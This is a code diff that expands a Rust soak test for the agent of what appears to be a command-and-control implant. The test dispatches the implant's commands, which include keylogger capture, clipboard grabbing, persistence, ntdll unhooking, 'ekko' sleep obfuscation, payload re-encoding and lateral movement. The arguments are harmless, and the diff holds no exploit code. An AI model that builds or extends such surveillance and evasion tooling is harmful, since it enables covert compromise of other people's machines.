@@ -8,6 +8,24 @@
 //! It is intentionally lightweight (no network I/O, no PTYs) so that it can
 //! run in CI without flakiness while still catching obvious leaks in the
 //! handler hot path.
+//!
+//! ## Command Coverage
+//!
+//! The soak loop dispatches a broad set of commands to exercise real code
+//! paths rather than just the trivial `Ping` / `GetSystemInfo` pair:
+//!
+//! | Category | Commands |
+//! |----------|----------|
+//! | Core     | `Ping`, `GetSystemInfo`, `Shutdown`, `ReloadConfig` |
+//! | File ops | `ListDirectory`, `ReadFile`, `WriteFile` |
+//! | Process  | `ListProcesses` |
+//! | Plugins  | `ListPlugins`, `GetPluginInfo`, `UnloadPlugin` |
+//! | Shell    | `ShellList`, `ShellResize` |
+//! | P2P      | `ListTopology`, `ListLinks` |
+//! | Jobs     | `JobStatus` |
+//! | Morphing | `MorphNow`, `SetReencodeSeed` |
+//! | Sleep    | `SetSleepVariant` |
+//! | Misc     | `DiscoverNetwork`, `EnablePersistence`, `DisablePersistence` |
 
 use std::sync::Arc;
 use std::time::{Duration, Instant};
@@ -32,6 +50,87 @@ fn rss_kib() -> Option<u64> {
     None
 }
 
+/// Build the full command vector used by the soak loop.
+///
+/// Each iteration fires every command in this list, exercising the handler
+/// dispatcher across a wide surface area.  Commands that are feature-gated
+/// on Windows / network-discovery / etc. will still be dispatched — the
+/// handler simply returns an `Err(...)` string on non-enabled platforms,
+/// which is sufficient to exercise the match-arm bookkeeping (serialization,
+/// audit logging, config lock acquisition, etc.) without leaking resources.
+fn soak_commands() -> Vec<Command> {
+    use common::Command;
+    vec![
+        // ── Core ────────────────────────────────────────────────────────
+        Command::Ping,
+        Command::GetSystemInfo,
+        Command::Shutdown,
+        Command::ReloadConfig,
+        // ── Filesystem ──────────────────────────────────────────────────
+        Command::ListDirectory {
+            path: "/tmp".into(),
+        },
+        Command::ReadFile {
+            path: "/etc/hostname".into(),
+        },
+        Command::WriteFile {
+            path: "/tmp/orchestra_soak_test_write".into(),
+            content: b"soak-test-payload".to_vec(),
+        },
+        // ── Process ─────────────────────────────────────────────────────
+        Command::ListProcesses,
+        // ── Plugins ─────────────────────────────────────────────────────
+        Command::ListPlugins,
+        Command::GetPluginInfo {
+            plugin_id: "nonexistent".into(),
+        },
+        Command::UnloadPlugin {
+            plugin_id: "nonexistent".into(),
+        },
+        // ── Shell ───────────────────────────────────────────────────────
+        Command::ShellList,
+        Command::ShellResize {
+            session_id: 0,
+            cols: 80,
+            rows: 24,
+        },
+        // ── P2P ─────────────────────────────────────────────────────────
+        Command::ListTopology,
+        Command::ListLinks,
+        // ── Jobs ────────────────────────────────────────────────────────
+        Command::JobStatus {
+            job_id: "soak-test-job".into(),
+        },
+        // ── Morphing ────────────────────────────────────────────────────
+        Command::MorphNow { seed: 0xCAFE },
+        Command::SetReencodeSeed { seed: 0xBEEF },
+        // ── Sleep obfuscation ───────────────────────────────────────────
+        Command::SetSleepVariant {
+            variant: "ekko".into(),
+        },
+        // ── Network ─────────────────────────────────────────────────────
+        Command::DiscoverNetwork,
+        // ── Persistence ─────────────────────────────────────────────────
+        Command::EnablePersistence,
+        Command::DisablePersistence,
+        // ── Keylogger ───────────────────────────────────────────────────
+        Command::KeyloggerStart,
+        Command::KeyloggerDump { clear: false },
+        Command::KeyloggerStop,
+        // ── Clipboard ───────────────────────────────────────────────────
+        Command::ClipboardGet,
+        // ── Unhook (Windows, graceful error on Linux) ───────────────────
+        Command::UnhookNtdll,
+        // ── Evanesco ────────────────────────────────────────────────────
+        Command::EvanescoStatus,
+        Command::EvanescoSetThreshold { idle_ms: 5000 },
+        // ── Lateral movement (Windows, graceful error on Linux) ─────────
+        Command::RunApprovedScript {
+            script: "nonexistent".into(),
+        },
+    ]
+}
+
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn soak_handler_dispatch() {
     // Determine duration: short by default, hours when explicitly requested.
@@ -52,26 +151,23 @@ async fn soak_handler_dispatch() {
 
     let crypto = Arc::new(CryptoSession::from_shared_secret(b"soak-test"));
     let config = Arc::new(Mutex::new(Config::default()));
-    let (out_tx, _out_rx) = tokio::sync::mpsc::channel(16);
+    let (out_tx, _out_rx) = tokio::sync::mpsc::channel(64);
     let p2p_mesh = Arc::new(tokio::sync::Mutex::new(agent::p2p::P2pMesh::default()));
 
     let baseline = rss_kib();
     let started = Instant::now();
     let mut iterations: u64 = 0;
 
+    let commands = soak_commands();
+    eprintln!("soak: dispatching {} command variants per iteration", commands.len());
+
     let work = async {
         while started.elapsed() < test_duration {
-            for cmd in [
-                Command::Ping,
-                Command::GetSystemInfo,
-                Command::ListDirectory {
-                    path: "/tmp".into(),
-                },
-            ] {
+            for cmd in &commands {
                 let _ = agent::handlers::handle_command(
                     crypto.clone(),
                     config.clone(),
-                    cmd,
+                    cmd.clone(),
                     "admin",
                     out_tx.clone(),
                     p2p_mesh.clone(),
@@ -109,4 +205,17 @@ async fn soak_handler_dispatch() {
     }
 
     assert!(total > 0, "Soak loop should have made progress");
+}
+
+/// Verify that every command in the soak list can be serialized to JSON
+/// and deserialized back without error (catches serde regression early).
+#[test]
+fn soak_commands_serde_roundtrip() {
+    let commands = soak_commands();
+    assert!(commands.len() > 20, "soak command list should cover many variants");
+
+    for cmd in &commands {
+        let json = serde_json::to_string(cmd).expect("serialize soak command");
+        let _: common::Command = serde_json::from_str(&json).expect("deserialize soak command");
+    }
 }
